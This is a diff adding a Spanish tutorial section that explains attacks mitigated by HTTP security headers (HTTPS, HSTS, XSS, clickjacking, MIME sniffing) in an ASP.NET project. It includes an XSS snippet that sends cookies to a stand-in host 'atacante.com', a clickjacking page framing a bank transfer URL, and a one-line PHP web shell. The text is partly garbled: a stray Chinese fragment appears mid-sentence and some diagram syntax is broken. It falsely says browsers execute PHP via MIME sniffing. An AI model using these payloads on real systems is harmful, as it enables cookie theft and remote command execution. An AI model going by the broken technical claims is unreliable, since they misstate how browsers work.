@@ -234,6 +234,213 @@ public static class SecurityHeadersMiddlewareExtensions
 }
 ```
 
+### 27.4.1. Vulnerabilidades y Ataques Comunes
+
+A continuación se explican las principales vulnerabilidades que los security headers mitigan:
+
+#### HTTP vs HTTPS: El Problema del Texto Plano
+
+**Vulnerabilidad:** HTTP transmite datos en texto plano, permitiendo que cualquier atacante en la red pueda leer, modificar o inyectar información.
+
+```mermaid
+flowchart LR
+    subgraph "Ataque Man-in-the-Middle"
+        Cliente["👤 Usuario"] -->|"POST /auth/signin<br/>{email, password}"| Internet["🌐 Internet"]
+        Internet -->|"Datos interceptados"| Servidor["🖥️ Servidor"]
+        Hacker["😈 Atacante"] -.->|"Lee todo el tráfico"| Internet
+    end
+    
+    style Hacker fill:#e74c3c,color:#fff
+    style Cliente fill:#3498db,color:#fff
+    style Servidor fill:#27ae60,color:#fff
+```
+
+**Ejemplo de ataque:**
+```
+// Tráfico HTTP capturado (texto plano)
+POST /auth/signin HTTP/1.1
+Host: api.tienda.com
+Content-Type: application/json
+
+{"email":"admin@tienda.com","password":"admin123"}
+// El atacante puede leer: admin@tienda.com / admin123
+```
+
+**Solución con HTTPS:**
+```
+// Tráfico HTTPS cifrado (AES-256)
+POST /auth/signin HTTP/1.1
+Host: api.tienda.com
+Content-Type: application/json
+
+8a7b3c5d9e2f1a4b6c8d0e2f4a6b8c0d1e2f4a6b8c9d0e1f2a3b4c5d6e7f8a9b
+// El atacante ve: caracteres ilegibles, imposible de descifrar sin la clave
+```
+
+#### HTTP Strict Transport Security (HSTS)
+
+**Vulnerabilidad:** Un atacante puede realizar un ataque de "downgrade" forzando al usuario a usar HTTP en lugar de HTTPS.
+
+```mermaid
+sequenceDiagram
+    participant Usuario
+    participant Atacante
+    participant Servidor
+    
+    Note over Usuario: Usuario escribe api.tienda.com
+    
+    Usuario->>Atacante: DNS Request api.tienda.com
+    Atacante->>Usuario: IP falsa (atacante)
+    Usuario->>Atacante: GET http://api.tienda.com
+    Atacante->>Usuario: 200 OK (proxy a HTTP real)
+    
+    Note over Usuario: 🔴 PROBLEMA: Todo el tráfico<br/>pasa por el atacante
+```
+
+**Ataque de Downgrade:**
+1. Usuario intenta acceder a `https://api.tienda.com`
+2. Atacante intercepta y redirige a `http://api.tienda.com` (falsa)
+3. Usuario cree que está en HTTPS pero está en HTTP
+4. Todas las credenciales son robadas
+
+**Solución con HSTS:**
+```
+// Primera respuesta del servidor (HTTPS)
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+// El navegador guarda: "api.tienda.com SOLO acepta HTTPS"
+// En siguiente visita, el navegador rechaza HTTP directamente
+```
+
+#### XSS (Cross-Site Scripting)
+
+**Vulnerabilidad:** Un atacante inyecta código JavaScript malicioso que se ejecuta en el navegador de la víctima.
+
+```mermaid
+flowchart LR
+    subgraph "Ataque XSS"
+        Atacante["😈 Atacante"] -->|"Comentario malicioso<br/>\<script\>robCookies()\</script\>"| Servidor["🖥️ Servidor"]
+        Servidor -->|"Guarda en BD"| BD[(📦 Base de Datos)]
+        Usuario["👤 Usuario"] -->|"Carga página"| Servidor
+        Servidor -->|"Muestra comentario<br/>con script injectado"| Usuario
+        Usuario -->|"Script ejecuta<br/>roba cookies"| Atacante
+    end
+    
+    style Atacante fill:#e74c3c,color:#fff
+    style Usuario fill:#3498db,color:#fff
+```
+
+**Ejemplo de ataque XSS:**
+```html
+<!-- Comentario en un producto -->
+<script>
+  fetch('https://atacante.com/robar?cookie=' + document.cookie);
+</script>
+
+<!-- Cuando otro usuario ve el comentario, sus cookies son robadas -->
+```
+
+**Protección con X-XSS-Protection:**
+```
+X-XSS-Protection: 1; mode=block
+
+// El navegador detecta el script malicioso y lo bloquea
+```
+
+#### Clickjacking
+
+**Vulnerabilidad:** El atacante superpone una página legítima con un iframe transparente, engañando al usuario para que haga clic en botones ocultos.
+
+```mermaid
+flowchart TD
+    subgraph "Ataque Clickjacking"
+        subgraph "Página del Atacante (visible)"
+            A1["🎮 Botón 'Jugar'"
+            style A1 fill:#27ae60,color:#fff"]
+            A2["📺 Video gracioso"
+            style A2 fill:#3498db,color:#fff"]
+        end
+        
+        subgraph "Iframe invisible (superpuesto)"
+            B1["🔐 Botón 'Eliminar cuenta'"]
+            B2["💰 Botón 'Transferir dinero'"]
+        end
+        
+        A1 -->|"Usuario cree que hace<br/>clic en 'Jugar'"| B1
+        A2 -->|"Usuario cree que hace<br/>clic en 'Video'"| B2
+        
+        style B1 fill:#e74c3c,color:#fff,stroke-dasharray: 5 5
+        style B2 fill:#e74c3c,color:#fff,stroke-dasharray: 5 5
+    end
+```
+
+**Ejemplo de clickjacking:**
+```html
+<!-- Página del atacante -->
+<html>
+  <style>
+    iframe { position: absolute; opacity: 0; }
+    button { position: absolute; top: 100px; }
+  </style>
+  <iframe src="https://banco.com/transferir?cuenta=atacante&monto=10000"></iframe>
+  <button>¡Gana un premio!</button>
+</html>
+<!-- El usuario cree hacer clic en el premio, pero en realidad
+     hace clic en Transferir del banco -->
+```
+
+**Protección con X-Frame-Options:**
+```
+X-Frame-Options: DENY
+
+// El navegador rechaza mostrar la página en un iframe
+```
+
+#### MIME Sniffing
+
+**Vulnerabilidad:** El navegador "adivina" el tipo de archivo basándose en su contenido, lo que puede permitir ejecutar código malicioso.
+
+```mermaid
+flowchart LR
+    subgraph "Ataque MIME Sniffing"
+        Atacante["😈 Atacante"] -->|"Archivo malicioso<br/>upload.php con<br/>contenido JPEG"| Servidor["🖥️ Servidor"]
+        Servidor -->|"Guarda como imagen<br/>(parece JPEG)"| BD[(📦 BD")]
+        Usuario["👤 Usuario"] -->|"Descarga archivo<br/>como imagen"| Servidor
+        Servidor -->|"Content-Type: image/jpeg<br/>pero el navegador<br/>detecta PHP"| Usuario
+        Usuario -->|"Ejecuta el PHP<br/>como código"| Peligro["💥 Código<br/>malicioso<br/>ejecutado"]
+    end
+    
+    style Atacante fill:#e74c3c,color:#fff
+    style Peligro fill:#e74c3c,color:#fff
+```
+
+**Ejemplo de MIME Sniffing:**
+```
+// Archivo sub看起来 como imagen pero contiene PHP
+Content-Type: image/jpeg
+
+<?php
+system($_GET['cmd']);  // El navegador lo ejecuta como código PHP
+```
+
+**Protección con X-Content-Type-Options:**
+```
+X-Content-Type-Options: nosniff
+
+// El navegador respeta el Content-Type declarado,
+// no "adivina" el tipo de archivo
+```
+
+### Comparación: Antes y Después
+
+| Vulnerabilidad | Antes (Sin Headers) | Después (Con Headers) |
+|----------------|---------------------|----------------------|
+| **HTTP→HTTPS** | Manual, vulnerable a downgrade | Automático, 301 redirect |
+| **HSTS** | ❌ Navegador puede usar HTTP | ✅ 365 días, subdominios, preload |
+| **XSS** | ❌ Sin protección | ✅ X-XSS-Protection: 1; mode=block |
+| **Clickjacking** | ❌ Página puede iframearse | ✅ X-Frame-Options: DENY |
+| **MIME Sniffing** | ❌ Navegador adivina tipos | ✅ X-Content-Type-Options: nosniff |
+
 ### Explicación de Cada Header
 
 ```mermaid
